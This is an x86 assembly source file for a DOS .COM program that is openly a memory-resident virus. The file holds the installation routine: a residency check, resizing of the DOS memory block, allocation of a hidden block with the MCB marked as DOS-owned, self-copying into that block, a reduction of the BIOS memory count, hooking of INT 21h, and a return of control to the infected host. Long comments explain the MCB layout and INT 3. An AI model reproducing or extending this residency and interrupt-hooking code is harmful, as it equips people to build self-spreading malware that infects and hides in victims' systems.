
.model tiny
include data.asm
include Macro.asm ; the macro help Routines 
include Functions.asm  
.code
;defines where the machine code place in memory
;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
;Another example is ORG 7C00H for intel exe program format.
org 100h 
start:
   ;mov dl,'A' ; print 'A'
   ;mov ah,2h
   ;int 21h
    START:
jmp INSTALL_VIRUS ;go to the installation routine


INSTALL_VIRUS:
GetRelocation bp
;VIRUS RESIDENCY CHECK 
mov ax, nVirusID
int 21h
cmp bx, nVirusID ;virus are installed ?
je VIRUS_ALREADY_INSTALLED
;RESIZE MEMORY BLOCK 
mov ax, ds
dec ax
mov es, ax ;get MCB
;----------------------------------------------------------------------------
;MCB - DOS Memory Control Block Format
;----------------------------------------------------------------------------
;ffset Size      Description
; 00   byte   'M' 4Dh  member of a MCB chain, (not last)
;            'Z' 5Ah  indicates last entry in MCB chain
;           other values cause "Memory Allocation Failure" on exit
; 01   word   PSP segment address of MCB owner (Process Id)
;               possible values:
;               0 = free
;               8 = Allocated by DOS before first user pgm loaded
;               other = Process Id/PSP segment address of owner
; 03   word   number of paras related to this MCB (excluding MCB)
; 05   11bytes  reserved
; 08   8bytes  ASCII program name, NULL terminated if less than max
;                length (DOS 4.x+)
; 10   nbytes  first byte of actual allocated memory block
;          - to find the first MCB in the chain, use  INT 21,52
;           - DOS 3.1+ the first memory block contains the DOS data segment
;                     ie., installable drivers, buffers, etc
;               - DOS 4.x the first memory block is divided into subsegments,
;                        with their own memory control blocks; offset 0000h is the first
;                  - the 'M' and 'Z' are said to represent Mark Zbikowski
;                  - the MCB chain is often referred to as a linked list, but
;                    technically isn't
cmp byte ptr es:[0],'Z' ;is it the last MCB in the chain ?
jne CANNOT_INSTALL
mov bx, es:[3] ;get block size
sub bx, ((offset END_OF_CODE-offset START+15)/16)+1 ;compute new block size in paragraphs
push ds
pop es
mov ah, 4Ah ;resize memory block
int 21h
; ALLOCATE MEMORY 
mov ah, 48h ;allocate memory for the virus
mov bx, (offset END_OF_CODE - offset START+15)/16 ;16BITS
int 21h ;AX will contain segment of allocated block
; UPDATE MCB 
dec ax 
mov es, ax ;get MCB ES - extra segment register, it's up to a coder to define its usage.
mov byte ptr [es:[0]], 'Z' ;mark MCB as last in chain
mov word ptr [es:[1]], 8 ;mark DOS as owner of memory block
inc ax
mov es, ax ;get memory block
xor di, di ;destination address
lea si, bp+START ;start of virus code in memory
mov cx, offset END_OF_CODE-offset START
cld;clears the direction flag. This tells the 8086 that it must increment the SI and DI register after each iteration
rep movsb ;copy virus
int 3h;INT 3 causes an interrupt and calls an interrupt vector set up by the OS=DOS
;When active the debugger sets his own interrupt handler for INT3 in the system. 
;Any call to INT3 will cause the running program to *break* (stop execution) and branch out execution to the debugger's INT3 handler.
; After some basic state saving, the INT3 handler usually yields the control to the debugger GUI. 
;When you want to debug a program, debugger loads the program code and if available it's source code in memory. 
;Then the programmer goes and sets breakpoint using the source code. 
;If the program is compiled with debug code, debugger easily locates the assembly instruction generated for the marked source code line. 
;Then it saves this instruction into some memory and replaces it with INT3. This code is restored back after INT3 is invoked.
;This was a powerful mechanism back in the days for debugging and also cracking programs. 
;One could easily write a TSR (Terminate and Stay Resident) in DOS for handling INT3 then place an INT3 in the code which he wants to patch.

push es
pop ds ;make DS = segment of newly allocated block
mov ax, 40h
mov es, ax ;get BIOS segment
sub word ptr [es:[13h]], (offset END_OF_CODE-offset START+1023)/1024
;reduce available memory    
; INSTALL NEW ISR FOR INT 21h 
mov al, nISRNumber
lea si, dwOldExecISR-100h
lea dx, NewDosISR-100h
call HookISR
;  UPDATE CALL INSTRUCTION IN NewExecISR 
mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction
;in PROC NewDOSISR
CANNOT_INSTALL:
VIRUS_ALREADY_INSTALLED:
;TRANSFER CONTROL TO HOST PROGRAM 
push cs
push cs
pop ds
pop es
mov di, 100h
lea si, bp+HostBytesOld
mov cx,5 ;restore 5 bytes
rep movsb
mov bx, 100h
push bx
ret ;transfer to host program

END_OF_CODE:
end start



